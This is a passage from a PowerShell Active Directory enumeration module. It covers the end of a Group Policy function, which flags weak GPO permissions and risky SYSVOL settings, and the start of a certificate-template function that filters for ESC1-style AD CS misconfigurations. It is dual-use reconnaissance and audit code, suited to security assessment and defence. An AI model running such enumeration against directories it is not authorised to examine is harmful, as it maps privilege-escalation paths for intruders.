                    '{7150F9BF-48AD-4DA4-A49C-29EF4A8369BA}' = 'Group Policy Infrastructure'
                    '{728EE579-943C-4519-9EF7-AB56765798ED}' = 'Group Policy Data Sources'
                    '{74EE6C03-5363-4554-B161-627540339CAB}' = 'Group Policy Scheduled Tasks'
                    '{7933F41E-56F8-41d6-A31C-4148A711EE93}' = 'Windows Search Group Policy Extension'
                    '{79F92669-4224-476C-9C5C-6EFB4D87DF4A}' = 'Local Users and Groups'
                    '{7B849a69-220F-451E-B3FE-2CB811AF94AE}' = 'Internet Explorer Zonemapping'
                    '{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}' = 'Security Settings'
                    '{8A28E2C5-8D06-49A4-A08C-632DAA493E17}' = 'Deployed Printer Connections'
                    '{91FBB303-0CD5-4055-BF42-E512A681B325}' = 'Group Policy Services'
                    '{942A8E4F-A261-11D1-A760-00C04FB9603F}' = 'Software Installation'
                    '{9AD2BAFE-63B4-4883-A08C-C3C6196BCAFD}' = 'Power Options'
                    '{A2E30F80-D7DE-11D2-BBDE-00C04F86AE3B}' = 'Internet Explorer Branding'
                    '{A3F3E39B-5D83-4940-B954-28315B82F0A8}' = 'Group Policy Drive Maps'
                    '{AADCED64-746C-4633-A97C-D61349046527}' = 'Group Policy Folders'
                    '{B05566AC-FE9C-4368-BE01-7A4CBB6CBA11}' = 'Group Policy Preference Tool'
                    '{B087BE9D-ED37-454F-AF9C-04291E351182}' = 'Group Policy Preferences'
                    '{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}' = 'EFS Recovery'
                    '{B587E2B1-4D59-4E7E-AED9-22B9DF11D053}' = '802.3 Group Policy'
                    '{B9CCA4DE-E2B9-4CBD-BF7D-11B6EBFBDDF7}' = 'Group Policy Network Options'
                    '{BC75B1ED-5833-4858-9BB4-B1E212E5790D}' = 'Group Policy INI Files'
                    '{BEE07A6A-EC9F-4659-B8C9-0B1937907C83}' = 'Group Policy Preference CSE'
                    '{C418DD9D-0D14-4EFB-8FBF-CFE535C8FAC7}' = 'Group Policy Shortcuts'
                    '{62C1845D-C4A6-4ACB-BBB0-C895FD090385}' = 'Microsoft Offline Files'
                    '{C631DF4C-088F-4156-B058-4375F0853CD8}' = 'Microsoft Offline Files'
                    '{CDEAFC3D-948D-49DD-AB12-E578BA4AF7AA}' = 'TCPIP'
                    '{D02B1F72-3407-48AE-BA88-E8213C6761F1}' = 'Wireless Group Policy'
                    '{E437BC1C-AA7D-11D2-A382-00C04F991E27}' = 'IP Security'
                    '{E47248BA-94CC-49C4-BBB5-9EB7F05183D0}' = 'Group Policy Internet Settings'
                    '{E4F48E54-F38D-4884-BFB9-D4D2E5729C18}' = 'Group Policy Start Menu Settings'
                    '{E5094040-C46C-4115-B030-04FB2E545B00}' = 'Group Policy Regional Options'
                    '{E62688F0-25FD-4c90-BFF5-F508B9D2E31F}' = 'Group Policy Environment'
                    '{E6BEFC42-E5F6-4AEB-B560-A2C1A6BEC5F0}' = 'Audit Policy Configuration'
                    '{F3CCC681-B74C-4060-9F26-CD84525DCA2A}' = 'Audit Policy Configuration'
                    '{F9C77450-3A41-477E-9310-9ACD617BD9E3}' = 'Group Policy Applications'
                    '{FC715823-C5FB-11D1-9EEF-00A0C90347FF}' = 'Internet Explorer Maintenance Extension Protocol'
                    '{FBF687E6-F063-4D9F-9F4F-FD9A26ACDD5F}' = 'Certificates'
                }

                # Parse gPCMachineExtensionNames (Client-Side Extensions)
                # Format: [{CSE-GUID}{Tool-GUID}][{CSE-GUID}{Tool-GUID}]...
                if ($GPO.gPCMachineExtensionNames) {
                    $ExtensionString = $GPO.gPCMachineExtensionNames
                    # Extract all [{GUID}{GUID}] pairs
                    $ExtensionPairs = [regex]::Matches($ExtensionString, '\[(\{[0-9a-fA-F-]+\})(\{[0-9a-fA-F-]+\})\]')

                    $ParsedExtensions = @()
                    foreach ($Match in $ExtensionPairs) {
                        $CSEGUID = $Match.Groups[1].Value
                        $ToolGUID = $Match.Groups[2].Value

                        # Resolve GUIDs to names
                        $CSEName = if ($CSENames.ContainsKey($CSEGUID)) { $CSENames[$CSEGUID] } else { $CSEGUID }
                        $ToolName = if ($ToolNames.ContainsKey($ToolGUID)) { $ToolNames[$ToolGUID] } else { $ToolGUID }

                        # Format: "CSE Name (Tool Name)"
                        $ParsedExtensions += "$CSEName ($ToolName)"
                    }

                    # Replace string with array of human-readable names
                    $GPO.gPCMachineExtensionNames = $ParsedExtensions
                }

                # Parse gPCUserExtensionNames (same format as Machine)
                if ($GPO.gPCUserExtensionNames) {
                    $ExtensionString = $GPO.gPCUserExtensionNames
                    $ExtensionPairs = [regex]::Matches($ExtensionString, '\[(\{[0-9a-fA-F-]+\})(\{[0-9a-fA-F-]+\})\]')

                    $ParsedExtensions = @()
                    foreach ($Match in $ExtensionPairs) {
                        $CSEGUID = $Match.Groups[1].Value
                        $ToolGUID = $Match.Groups[2].Value

                        # Resolve GUIDs to names
                        $CSEName = if ($CSENames.ContainsKey($CSEGUID)) { $CSENames[$CSEGUID] } else { $CSEGUID }
                        $ToolName = if ($ToolNames.ContainsKey($ToolGUID)) { $ToolNames[$ToolGUID] } else { $ToolGUID }

                        # Format: "CSE Name (Tool Name)"
                        $ParsedExtensions += "$CSEName ($ToolName)"
                    }

                    # Replace string with array of human-readable names
                    $GPO.gPCUserExtensionNames = $ParsedExtensions
                }
            }

            # If ShowLinkedOU is set, return only linked OUs (like -ShowMembers in Get-DomainGroup)
            if ($ShowLinkedOU) {
                Write-Log "[Get-DomainGPO] Searching for OUs linked to GPO..."

                # Query all OUs and Domain root with gPLink attribute (use Get-DomainObject)
                $AllOUs = @(Get-DomainObject `
                    -LDAPFilter "(|(objectClass=organizationalUnit)(objectClass=domain))" `
                    -Properties @('distinguishedName', 'gPLink') `
                    -SearchBase $Script:LDAPContext.DomainDN | Where-Object { $_.gPLink })
                Write-Log "[Get-DomainGPO] Found $($AllOUs.Count) OUs/Containers with gPLink attribute"

                # Since Identity is required, there should be only 1 GPO
                $GPO = $GPOs[0]
                $LinkedOUs = @()
                $GPOGUID = $GPO.name  # GPO GUID (already includes braces like {GUID})

                foreach ($OU in $AllOUs) {
                    # Check if this OU's gPLink contains the GPO GUID
                    # gPLink format: [LDAP://cn={GUID},cn=policies,cn=system,DC=domain,DC=com;0]
                    if ($OU.gPLink -match [regex]::Escape($GPOGUID)) {
                        $LinkedOUs += $OU.distinguishedName
                    }
                }

                Write-Log "[Get-DomainGPO] GPO '$($GPO.displayName)' is linked to $($LinkedOUs.Count) OU(s)"

                return $LinkedOUs
            }

            # If ShowPermissions is set, analyze ACLs for dangerous permissions
            if ($ShowPermissions) {
                Write-Log "[Get-DomainGPO] Analyzing GPO permissions..."

                # Need raw nTSecurityDescriptor bytes for ACL analysis
                # Query GPOs again with -Raw to get unprocessed security descriptors
                $RawParams = @{
                    LDAPFilter = $Filter
                    Properties = @('distinguishedName', 'nTSecurityDescriptor')
                    Raw = $true
                }
                if ($SearchBase) { $RawParams['SearchBase'] = $SearchBase }

                $RawGPOs = @(Get-DomainObject @RawParams)
                Write-Log "[Get-DomainGPO] Retrieved raw security descriptors for $($RawGPOs.Count) GPO(s)"

                # Build lookup table from raw GPO data
                $ACLLookup = @{}
                foreach ($RawGPO in $RawGPOs) {
                    if ($RawGPO.nTSecurityDescriptor -and $RawGPO.nTSecurityDescriptor -is [byte[]]) {
                        $ACLLookup[$RawGPO.distinguishedName] = $RawGPO.nTSecurityDescriptor
                    }
                }

                # Uses central privileged check from Test-IsPrivileged.ps1

                foreach ($GPO in $GPOs) {
                    $DangerousPermissions = @()

                    $SecurityDescriptorBytes = $ACLLookup[$GPO.distinguishedName]

                    if ($SecurityDescriptorBytes) {
                        try {
                            # Parse raw bytes into ActiveDirectorySecurity
                            $RawSD = New-Object System.DirectoryServices.ActiveDirectorySecurity
                            $RawSD.SetSecurityDescriptorBinaryForm($SecurityDescriptorBytes)

                            # Get DACL
                            $DACL = $RawSD.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])

                            # Dangerous rights as enum for bitmask comparison
                            # Note: Central $Script:GenericDangerousRights uses strings for simple -contains checks
                            # Here we need enum values for bitwise AND comparison with ActiveDirectoryRights
                            $DangerousRightsEnum = @(
                                [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
                                [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl,
                                [System.DirectoryServices.ActiveDirectoryRights]::WriteOwner,
                                [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                                [System.DirectoryServices.ActiveDirectoryRights]::GenericWrite
                            )

                            foreach ($ACE in $DACL) {
                                # Check if ACE grants dangerous rights
                                $HasDangerousRights = $false
                                $GrantedRights = @()

                                foreach ($Right in $DangerousRightsEnum) {
                                    if ($ACE.ActiveDirectoryRights -band $Right) {
                                        $HasDangerousRights = $true
                                        $GrantedRights += $Right.ToString()
                                    }
                                }

                                if ($HasDangerousRights -and $ACE.AccessControlType -eq 'Allow') {
                                    $TrusteeSID = $ACE.IdentityReference.Value
                                    $TrusteeName = ConvertFrom-SID -SID $TrusteeSID

                                    # Skip privileged accounts using central function
                                    $category = (Test-IsPrivileged -Identity $TrusteeSID).Category
                                    if ($category -ne 'Privileged') {
                                        # Determine severity based on rights and category
                                        $Severity = "Medium"
                                        if ($GrantedRights -contains 'GenericAll' -or $GrantedRights -contains 'WriteDacl' -or $GrantedRights -contains 'WriteOwner') {
                                            $Severity = "High"
                                        }

                                        # Broad groups (Domain Users, Everyone, Authenticated Users) with GPO write = Critical
                                        # This means potentially ALL domain users can modify the GPO!
                                        if ($category -eq 'BroadGroup') {
                                            $Severity = "Critical"
                                        }

                                        $DangerousPermissions += [PSCustomObject]@{
                                            Trustee = $TrusteeName
                                            TrusteeSID = $TrusteeSID
                                            Rights = $GrantedRights -join ', '
                                            Severity = $Severity
                                            Description = "Non-privileged principal has GPO modification rights - potential privilege escalation"
                                        }

                                        Write-Log "[Get-DomainGPO] Found dangerous permission on GPO '$($GPO.displayName)': $TrusteeName ($($GrantedRights -join ', '))"
                                    }
                                }
                            }

                        } catch {
                            Write-Log "[Get-DomainGPO] Error parsing nTSecurityDescriptor for GPO '$($GPO.displayName)': $_"
                        }
                    }

                    # Add DangerousPermissions property
                    $GPO | Add-Member -NotePropertyName "DangerousPermissions" -NotePropertyValue $DangerousPermissions -Force

                    if ($DangerousPermissions.Count -gt 0) {
                        Write-Log "[Get-DomainGPO] GPO '$($GPO.displayName)' has $($DangerousPermissions.Count) dangerous permission(s)"
                    }
                }
            }

            # If ShowDangerousSettings is set, analyze GPO contents for dangerous configurations
            if ($ShowDangerousSettings) {
                Write-Log "[Get-DomainGPO] Analyzing GPOs for dangerous settings..."

                # Pre-resolve IP for hostname substitution when custom DNS is used
                $resolvedSmbIP = $null
                if ($Script:LDAPContext -and $Script:LDAPContext['DnsServer'] -and $Script:LDAPContext['ServerIP']) {
                    $resolvedSmbIP = $Script:LDAPContext['ServerIP']
                    Write-Log "[Get-DomainGPO] Using resolved IP for SYSVOL access: $resolvedSmbIP"
                }

                # Use Invoke-SMBAccess to handle custom DNS and SimpleBind credentials
                Invoke-SMBAccess -Description "Analyzing GPO dangerous settings" -ErrorHandling "Warn" -ScriptBlock {

                foreach ($GPO in $GPOs) {
                    $DangerousSettings = @()

                    # Get GPO file system path
                    $GPOPath = $GPO.gPCFileSysPath

                    # If custom DNS is used, replace hostname with resolved IP in UNC path
                    if ($resolvedSmbIP -and $GPOPath -match '^\\\\([^\\]+)\\') {
                        $uncHost = $Matches[1]
                        $ipTest = $null
                        if (-not [System.Net.IPAddress]::TryParse($uncHost, [ref]$ipTest)) {
                            $GPOPath = $GPOPath -replace "^\\\\[^\\]+\\", "\\$resolvedSmbIP\"
                            Write-Log "[Get-DomainGPO] Converted UNC hostname to IP for GPO path"
                        }
                    }

                    if ($GPOPath -and (Test-Path $GPOPath -ErrorAction SilentlyContinue)) {
                        Write-Log "[Get-DomainGPO] Analyzing GPO path: $GPOPath"

                        # Check for Scheduled Tasks (GPO Immediate Tasks)
                        $ScheduledTasksPath = Join-Path $GPOPath "Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
                        if (Test-Path $ScheduledTasksPath -ErrorAction SilentlyContinue) {
                            try {
                                [xml]$TasksXML = Get-Content $ScheduledTasksPath -ErrorAction SilentlyContinue
                                $TaskCount = @($TasksXML.ScheduledTasks.ChildNodes | Where-Object { $_.name -ne '#comment' }).Count
                                if ($TaskCount -gt 0) {
                                    $DangerousSettings += [PSCustomObject]@{
                                        Type = "Scheduled Tasks"
                                        Severity = "High"
                                        Description = "$TaskCount scheduled task(s) configured - potential for arbitrary code execution"
                                        Path = $ScheduledTasksPath
                                    }
                                    Write-Log "[Get-DomainGPO] Found $TaskCount scheduled task(s) in GPO '$($GPO.displayName)'"
                                }
                            } catch {
                                Write-Log "[Get-DomainGPO] Error parsing ScheduledTasks.xml: $_"
                            }
                        }

                        # Check for Logon/Startup Scripts (Computer)
                        $ComputerScriptsIni = Join-Path $GPOPath "Machine\Scripts\scripts.ini"
                        if (Test-Path $ComputerScriptsIni -ErrorAction SilentlyContinue) {
                            $ScriptContent = Get-Content $ComputerScriptsIni -Raw -ErrorAction SilentlyContinue
                            if ($ScriptContent -and $ScriptContent.Trim().Length -gt 0) {
                                $DangerousSettings += [PSCustomObject]@{
                                    Type = "Computer Startup/Shutdown Scripts"
                                    Severity = "High"
                                    Description = "Computer scripts configured - runs as SYSTEM on boot/shutdown"
                                    Path = $ComputerScriptsIni
                                }
                                Write-Log "[Get-DomainGPO] Found computer scripts in GPO '$($GPO.displayName)'"
                            }
                        }

                        # Check for Logon/Startup Scripts (User)
                        $UserScriptsIni = Join-Path $GPOPath "User\Scripts\scripts.ini"
                        if (Test-Path $UserScriptsIni -ErrorAction SilentlyContinue) {
                            $ScriptContent = Get-Content $UserScriptsIni -Raw -ErrorAction SilentlyContinue
                            if ($ScriptContent -and $ScriptContent.Trim().Length -gt 0) {
                                $DangerousSettings += [PSCustomObject]@{
                                    Type = "User Logon/Logoff Scripts"
                                    Severity = "Medium"
                                    Description = "User scripts configured - runs in user context"
                                    Path = $UserScriptsIni
                                }
                                Write-Log "[Get-DomainGPO] Found user scripts in GPO '$($GPO.displayName)'"
                            }
                        }

                        # Check for Registry.xml (Registry Preferences)
                        $RegistryXMLPaths = @(
                            (Join-Path $GPOPath "Machine\Preferences\Registry\Registry.xml"),
                            (Join-Path $GPOPath "User\Preferences\Registry\Registry.xml")
                        )

                        foreach ($RegPath in $RegistryXMLPaths) {
                            if (Test-Path $RegPath -ErrorAction SilentlyContinue) {
                                try {
                                    [xml]$RegXML = Get-Content $RegPath -ErrorAction SilentlyContinue
                                    $RegCount = @($RegXML.RegistrySettings.ChildNodes | Where-Object { $_.name -ne '#comment' }).Count

                                    if ($RegCount -gt 0) {
                                        # Check for Run keys (common persistence mechanism)
                                        $RunKeys = $RegXML.SelectNodes("//Registry") | Where-Object {
                                            $_.Properties.key -match "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                                        }

                                        $Context = if ($RegPath -match "\\Machine\\") { "Machine" } else { "User" }

                                        if ($RunKeys.Count -gt 0) {
                                            $DangerousSettings += [PSCustomObject]@{
                                                Type = "Registry Run Keys ($Context)"
                                                Severity = "High"
                                                Description = "$($RunKeys.Count) Run key(s) configured - potential persistence mechanism"
                                                Path = $RegPath
                                            }
                                            Write-Log "[Get-DomainGPO] Found $($RunKeys.Count) Run key(s) in GPO '$($GPO.displayName)'"
                                        } else {
                                            $DangerousSettings += [PSCustomObject]@{
                                                Type = "Registry Settings ($Context)"
                                                Severity = "Low"
                                                Description = "$RegCount registry setting(s) configured"
                                                Path = $RegPath
                                            }
                                        }
                                    }
                                } catch {
                                    Write-Log "[Get-DomainGPO] Error parsing Registry.xml: $_"
                                }
                            }
                        }

                        # Check for Groups.xml (Local Group Membership)
                        $GroupsXMLPaths = @(
                            (Join-Path $GPOPath "Machine\Preferences\Groups\Groups.xml"),
                            (Join-Path $GPOPath "User\Preferences\Groups\Groups.xml")
                        )

                        foreach ($GroupPath in $GroupsXMLPaths) {
                            if (Test-Path $GroupPath -ErrorAction SilentlyContinue) {
                                try {
                                    [xml]$GroupXML = Get-Content $GroupPath -ErrorAction SilentlyContinue
                                    $GroupCount = @($GroupXML.Groups.ChildNodes | Where-Object { $_.name -ne '#comment' }).Count

                                    if ($GroupCount -gt 0) {
                                        # Check for Administrators group modifications (S-1-5-32-544 = BUILTIN\Administrators)
                                        $AdminGroups = $GroupXML.SelectNodes("//Group") | Where-Object {
                                            $_.Properties.groupSid -eq 'S-1-5-32-544'
                                        }

                                        $Context = if ($GroupPath -match "\\Machine\\") { "Machine" } else { "User" }

                                        if ($AdminGroups.Count -gt 0) {
                                            $DangerousSettings += [PSCustomObject]@{
                                                Type = "Local Administrators Modification ($Context)"
                                                Severity = "Critical"
                                                Description = "Administrators group modification - potential privilege escalation"
                                                Path = $GroupPath
                                            }
                                            Write-Log "[Get-DomainGPO] Found Administrators group modification in GPO '$($GPO.displayName)'"
                                        } else {
                                            $DangerousSettings += [PSCustomObject]@{
                                                Type = "Local Group Membership ($Context)"
                                                Severity = "Medium"
                                                Description = "$GroupCount local group modification(s)"
                                                Path = $GroupPath
                                            }
                                        }
                                    }
                                } catch {
                                    Write-Log "[Get-DomainGPO] Error parsing Groups.xml: $_"
                                }
                            }
                        }

                        # Check for Services.xml (Service manipulation)
                        $ServicesXMLPath = Join-Path $GPOPath "Machine\Preferences\Services\Services.xml"
                        if (Test-Path $ServicesXMLPath -ErrorAction SilentlyContinue) {
                            try {
                                [xml]$ServicesXML = Get-Content $ServicesXMLPath -ErrorAction SilentlyContinue
                                $ServiceCount = @($ServicesXML.Services.ChildNodes | Where-Object { $_.name -ne '#comment' }).Count
                                if ($ServiceCount -gt 0) {
                                    $DangerousSettings += [PSCustomObject]@{
                                        Type = "Service Configuration"
                                        Severity = "High"
                                        Description = "$ServiceCount service(s) configured - potential for privilege escalation"
                                        Path = $ServicesXMLPath
                                    }
                                    Write-Log "[Get-DomainGPO] Found $ServiceCount service(s) in GPO '$($GPO.displayName)'"
                                }
                            } catch {
                                Write-Log "[Get-DomainGPO] Error parsing Services.xml: $_"
                            }
                        }

                    } else {
                        Write-Log "[Get-DomainGPO] GPO path not accessible or does not exist: $GPOPath"
                    }

                    # Add DangerousSettings property
                    $GPO | Add-Member -NotePropertyName "DangerousSettings" -NotePropertyValue $DangerousSettings -Force

                    if ($DangerousSettings.Count -gt 0) {
                        Write-Log "[Get-DomainGPO] GPO '$($GPO.displayName)' has $($DangerousSettings.Count) dangerous setting(s)"
                    }
                }

                } # End Invoke-SMBAccess ScriptBlock
            }

            # Cache unfiltered results for subsequent calls within the same session
            if ($isUnfilteredCall -and $GPOs.Count -gt 0) {
                $Script:CachedAllGPOs = $GPOs
                Write-Log "[Get-DomainGPO] Cached $($GPOs.Count) GPOs for session reuse"
            }

            return $GPOs

        } catch {
            Write-Log "[Get-DomainGPO] Error: $_"
            throw
        }
    }

    end {
        Write-Log "[Get-DomainGPO] GPO enumeration completed"
    }
}



# ----- Get-CertificateTemplate.ps1 -----

function Get-CertificateTemplate {
<#
.SYNOPSIS
    Retrieves ADCS certificate templates from Active Directory.

.DESCRIPTION
    Get-CertificateTemplate queries the Configuration partition for certificate templates (pKICertificateTemplate objects).
    Certificate templates define the settings for certificates issued by Active Directory Certificate Services (AD CS).

    This function returns certificate template objects with all attributes converted to readable formats (flags, OIDs, etc.) by Invoke-LDAPSearch.
    Use -Raw to get unconverted raw LDAP values for programmatic processing.

.PARAMETER Identity
    The name or distinguished name of a specific certificate template to retrieve.
    Supports wildcards when using -LDAPFilter.

.PARAMETER Name
    Alias for Identity. The display name of the certificate template.

.PARAMETER LDAPFilter
    Custom LDAP filter for querying certificate templates.
    Will be combined with (objectClass=pKICertificateTemplate).
    Example: "(msPKI-Certificate-Name-Flag=1)"

.PARAMETER Properties
    Array of properties to retrieve. If not specified, retrieves common certificate
    template properties.

    Common properties:
    - cn, displayName, distinguishedName
    - msPKI-Certificate-Name-Flag (naming options)
    - msPKI-Enrollment-Flag (enrollment options)
    - msPKI-Private-Key-Flag (private key options)
    - pKIExtendedKeyUsage (EKU OIDs)
    - msPKI-Certificate-Application-Policy (application policy OIDs)
    - pKICriticalExtensions (critical extension OIDs)
    - msPKI-Template-Schema-Version (template version)
    - msPKI-Template-Minor-Revision (minor revision)
    - pKIExpirationPeriod (validity period)
    - pKIOverlapPeriod (renewal overlap period)
    - pKIKeyUsage (key usage flags)
    - nTSecurityDescriptor (enrollment permissions)

.PARAMETER SearchBase
    Custom search base DN. If not specified, automatically uses the Configuration partition: CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=...

.PARAMETER Domain
    Target domain for the query. If not specified, uses the current domain.

.PARAMETER Server
    Specific domain controller to query.

.PARAMETER Credential
    PSCredential object for authentication.

.PARAMETER Raw
    Return raw LDAP attribute values without conversion.
    Useful for programmatic processing when you need the raw data.

.PARAMETER ShowAll
    Show ALL certificate templates (enabled and disabled).
    By default, only templates published to at least one CA are shown.
    Use -ShowAll to include unpublished templates that cannot be used for enrollment.

.PARAMETER EnrolleeSuppliesSubject
    Filter for templates with ENROLLEE_SUPPLIES_SUBJECT flag (ESC1 vulnerability).
    These templates allow the enrollee to specify arbitrary subject names, enabling privilege escalation attacks.

.PARAMETER NoSecurityExtension
    Filter for templates with NO_SECURITY_EXTENSION flag (ESC2 vulnerability).
    These templates do not include security extensions in issued certificates, making them vulnerable to certain attacks.

.PARAMETER ClientAuthentication
    Filter for templates with Client Authentication EKU (OID 1.3.6.1.5.5.7.3.2).
    These templates can be used for Kerberos authentication and are high-value targets.

.PARAMETER ExportableKey
    Filter for templates with EXPORTABLE_KEY flag.
    These templates allow private keys to be exported, enabling key theft attacks.

.PARAMETER NoManagerApproval
    Filter for templates that do NOT require manager approval (no PEND_ALL_REQUESTS flag).
    These templates can be enrolled immediately without approval, making them easier to exploit.

.EXAMPLE
    Get-CertificateTemplate

    Retrieves only enabled (published) certificate templates from the current forest.
    This is the default behavior - only templates available for enrollment are shown.

.EXAMPLE
    Get-CertificateTemplate -Identity "User"
    Retrieves the "User" certificate template.

.EXAMPLE
    Get-CertificateTemplate -LDAPFilter "(msPKI-Certificate-Name-Flag=1)"
    Finds all templates where the enrollee supplies the subject name (ESC1 vulnerability indicator).

.EXAMPLE
    Get-CertificateTemplate | Where-Object {
        $_.msPKI-Certificate-Name-Flag -contains "ENROLLEE_SUPPLIES_SUBJECT"
    }
    Finds all templates with ENROLLEE_SUPPLIES_SUBJECT flag (converted readable format).

.EXAMPLE
    Get-CertificateTemplate -Properties cn,msPKI-Enrollment-Flag,nTSecurityDescriptor
    Retrieves templates with specific properties only.

.EXAMPLE
    Get-CertificateTemplate -Raw
    Retrieves enabled templates with raw unconverted LDAP values.

.EXAMPLE
    Get-CertificateTemplate -ShowAll
    Retrieves ALL certificate templates (enabled and disabled).
    Useful for auditing all templates in AD, not just those available for enrollment.

.EXAMPLE
    Get-CertificateTemplate -EnrolleeSuppliesSubject
    Finds enabled templates with ESC1 vulnerability (ENROLLEE_SUPPLIES_SUBJECT).
    Quick way to identify templates allowing arbitrary subject names.

.EXAMPLE
    Get-CertificateTemplate -ClientAuthentication -NoManagerApproval
    Finds enabled templates with Client Authentication EKU that don't require manager approval.
    These are high-value targets for privilege escalation attacks.

.EXAMPLE
    Get-CertificateTemplate -ExportableKey
    Finds enabled templates that allow private key export.
    Useful for identifying templates vulnerable to key theft attacks.

.EXAMPLE
    Get-CertificateTemplate -EnrolleeSuppliesSubject -ClientAuthentication
    Combines filters to find ESC1-vulnerable templates with Client Auth EKU.
    This represents the most dangerous template configuration.

.EXAMPLE
    Get-CertificateTemplate -ShowAll -EnrolleeSuppliesSubject
    Finds ALL templates (enabled and disabled) with ESC1 vulnerability.
    Useful for complete auditing, not just immediate threats.

.EXAMPLE
    Get-CertificateTemplate -EnrollmentAllowed
    Finds enabled templates where enrollment permissions are granted.
    Not all published templates allow enrollment - this filters for actual enrollment rights.

.NOTES
    Author: Alexander Sturz (@_61106960_)

.LINK
    https://posts.specterops.io/certified-pre-owned-d95910965cd2
#>

    [CmdletBinding(DefaultParameterSetName='All')]
    [OutputType([System.Management.Automation.PSCustomObject])]
    param(
        [Parameter(Mandatory=$false, Position=0, ParameterSetName='Identity')]
        [Alias('Name')]
        [string]$Identity,

        [Parameter(Mandatory=$false, ParameterSetName='Filter')]
        [string]$LDAPFilter,

        [Parameter(Mandatory=$false)]
        [string[]]$Properties,

        [Parameter(Mandatory=$false)]
        [string]$SearchBase,

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$false)]
        [switch]$Raw,

        [Parameter(Mandatory=$false)]
        [switch]$ShowAll,

        [Parameter(Mandatory=$false)]
        [switch]$EnrolleeSuppliesSubject,

        [Parameter(Mandatory=$false)]
        [switch]$Export,

        [Parameter(Mandatory=$false)]
        [string]$ExportPath,

        [Parameter(Mandatory=$false)]
        [switch]$NoSecurityExtension,

        [Parameter(Mandatory=$false)]
        [switch]$ClientAuthentication,

        [Parameter(Mandatory=$false)]
        [switch]$ExportableKey,

        [Parameter(Mandatory=$false)]
        [switch]$NoManagerApproval,

        [Parameter(Mandatory=$false)]
        [switch]$EnrollmentAllowed
    )

    begin {
        Write-Log "[Get-CertificateTemplate] Starting certificate template enumeration"
    }

    process {
        # Ensure LDAP connection exists (pass only connection-related parameters)
        $ConnectionParams = @{}
        if ($Domain) { $ConnectionParams['Domain'] = $Domain }
        if ($Server) { $ConnectionParams['Server'] = $Server }
        if ($Credential) { $ConnectionParams['Credential'] = $Credential }

        if (-not (Ensure-LDAPConnection @ConnectionParams)) {
            return
        }

        try {
            # Export requires raw values for proper restoration
            # Automatically enable -Raw when -Export is specified
            if ($Export -and -not $Raw) {
                Write-Log "[Get-CertificateTemplate] Export mode: Automatically enabling -Raw to preserve original attribute values"
                $Raw = $true
            }

            # Build search base for Configuration partition if not provided
            if (-not $SearchBase) {
                # Get Configuration NC from RootDSE (stored in LDAPContext)
                $ConfigNC = $Script:LDAPContext.ConfigurationNamingContext

                if (-not $ConfigNC) {
                    Write-Error "Could not determine Configuration partition. Ensure LDAP connection is established."
                    return
                }

                # Build path to Certificate Templates container
                $SearchBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigNC"
                Write-Log "[Get-CertificateTemplate] Using SearchBase: $SearchBase"
            }

            # Build LDAP filter
            $Filter = "(objectClass=pKICertificateTemplate)"

            if ($PSCmdlet.ParameterSetName -eq 'Identity') {
                if ($Identity -match '^CN=') {
                    # DN lookup - RFC 4515 escape so '(' ')' in the DN do not break the filter.
                    $escapedIdentityDN = Escape-LDAPFilterDN -DistinguishedName $Identity
                    $Filter = "(&(objectClass=pKICertificateTemplate)(distinguishedName=$escapedIdentityDN))"
                }
                else {
                    # Search by name (cn or displayName) - raw $Identity preserves wildcard support
                    $Filter = "(&(objectClass=pKICertificateTemplate)(|(cn=$Identity)(displayName=$Identity)))"
                }
            }
            elseif ($PSCmdlet.ParameterSetName -eq 'Filter') {
                # Combine custom filter with objectClass filter
                $Filter = "(&(objectClass=pKICertificateTemplate)$LDAPFilter)"
            }

            Write-Log "[Get-CertificateTemplate] Using filter: $Filter"

            # If user specified custom properties, add them to minimum required properties (always need cn, displayName for output and filtering)
            $RequiredProperties = @('cn', 'displayName', 'distinguishedName')

            if ($Properties) {
                # User specified custom properties - add them to required properties
                $AllProperties = $RequiredProperties + $Properties | Select-Object -Unique
            } else {
                # No custom properties - use full default set
                $AllProperties = @(
                    # Basic Identification
                    'cn',
                    'displayName',
                    'distinguishedName',
                    'objectGUID',
                    'whenCreated',
                    'whenChanged',
                    'revision',
                    # Template Flags (ESC1, ESC2, ESC9)
                    'flags',
                    'msPKI-Certificate-Name-Flag',
                    'msPKI-Enrollment-Flag',
                    'msPKI-Private-Key-Flag',
                    # Key and Signature Requirements
                    'msPKI-Minimal-Key-Size',
                    'msPKI-RA-Signature',
                    # Registration Authority requirements (ESC3 condition 2 - on-behalf-of enrollment).
                    # msPKI-RA-Application-Policies holds the application policy OIDs that the
                    # co-signing certificate must carry; 1.3.6.1.4.1.311.20.2.1 = Certificate Request Agent.
                    'msPKI-RA-Application-Policies',
                    'msPKI-RA-Policies',
                    'pKIDefaultKeySpec',
                    'pKIKeyUsage',
                    # Schema and Versioning
                    'msPKI-Template-Schema-Version',
                    'msPKI-Template-Minor-Revision',
                    # EKU and Application Policy (ESC1, ESC3)
                    'pKIExtendedKeyUsage',
                    'msPKI-Certificate-Application-Policy',
                    'pKICriticalExtensions',
                    # Certificate Policy (ESC13 - OID Group Link)
                    'msPKI-Certificate-Policy',
                    # Validity and Issuance
                    'pKIMaxIssuingDepth',
                    'pKIExpirationPeriod',
                    'pKIOverlapPeriod',
                    # CSP and Cryptography
                    'pKIDefaultCSPs',
                    # Template Relationships
                    'msPKI-Supersede-Templates',
                    # Security and Permissions (ESC4, ESC5, ESC7)
                    'nTSecurityDescriptor',
                    # Publishing Information
                    'msPKI-Cert-Template-OID'
                )
            }

            # Build parameters for Get-DomainObject
            $GetParams = @{
                LDAPFilter = $Filter
                SearchBase = $SearchBase
                Properties = $AllProperties
            }

            # Pass through common parameters
            if ($Domain) { $GetParams['Domain'] = $Domain }
            if ($Server) { $GetParams['Server'] = $Server }
            if ($Credential) { $GetParams['Credential'] = $Credential }
            if ($Raw) { $GetParams['Raw'] = $true }

